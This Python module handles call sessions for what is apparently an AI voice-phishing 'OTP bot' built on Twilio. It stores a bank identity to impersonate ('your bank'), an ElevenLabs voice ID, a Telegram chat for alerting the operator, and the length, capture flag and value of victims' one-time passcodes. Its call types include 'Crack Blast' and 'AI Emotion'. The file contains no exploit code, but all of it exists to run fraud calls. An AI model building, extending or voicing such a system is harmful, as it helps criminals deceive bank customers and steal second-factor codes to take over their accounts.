"""
Per-call session management: conversation history, audio buffer, context.
Stores call-specific data for AI personalization.
Supports all call types: Normal, Manual, Custom, AI Emotion, Crack Blast.
"""


class CallSession:
    """Represents a single Twilio call session."""
    
    def __init__(self, call_sid: str):
        self.call_sid = call_sid
        self.history = []              # list of {"role": "user"/"agent", "text": ...}
        self.audio_buffer = bytearray()
        self.last_response = None
        self.company = "your bank"
        self.name = "Customer"
        self.voice_id = None           # ElevenLabs voice ID
        self.chat_id = None            # Telegram chat_id for notifications
        self.custom_script = None      # Custom script from user (Manual/Custom call)
        self.code_length = 6           # OTP code length (from user)
        self.emotion = "neutral"       # Voice emotion (for AI Emotion Call)
        self.otp_captured = False
        self.otp_value = None
        
        # Call type metadata
        self.call_type = "normal"      # normal, manual, custom, emotion, crack_blast
        self.mode_label = "AI Call"    # Display label
        
        # Manual/Custom-specific
        self.script_delay = 0          # Delay before playing script (seconds)
        self.gather_digits = 0         # Number of DTMF digits to collect
        self.fallback_message = ""     # Message if no input received
        
        # AI Emotion-specific  
        self.system_prompt_override = None  # Override default system prompt

    def add_user_message(self, text: str):
        """Add user input to conversation history."""
        self.history.append({"role": "user", "text": text})

    def add_agent_message(self, text: str):
        """Add AI response to conversation history."""
        self.history.append({"role": "agent", "text": text})

    def get_context(self, limit: int = 6) -> str:
        """Get recent conversation context for AI prompt."""
        recent = self.history[-limit:]
        lines = []
        for msg in recent:
            role = "Customer" if msg["role"] == "user" else "Agent"
            lines.append(f"{role}: {msg['text']}")
        return "\n".join(lines)
    
    def to_dict(self) -> dict:
        """Serialize session to dict for logging/debugging."""
        return {
            "call_sid": self.call_sid,
            "call_type": self.call_type,
            "mode_label": self.mode_label,
            "name": self.name,
            "company": self.company,
            "emotion": self.emotion,
            "code_length": self.code_length,
            "otp_captured": self.otp_captured,
            "otp_value": self.otp_value,
            "turns": len(self.history),
            "history": self.history,
            "voice_id": self.voice_id
        }


# In-memory session store
_sessions = {}


def get_session(call_sid: str) -> CallSession:
    """Retrieve or create a session for a call SID."""
    if call_sid not in _sessions:
        _sessions[call_sid] = CallSession(call_sid)
    return _sessions[call_sid]


def remove_session(call_sid: str):
    """Clean up session after call ends."""
    _sessions.pop(call_sid, None)

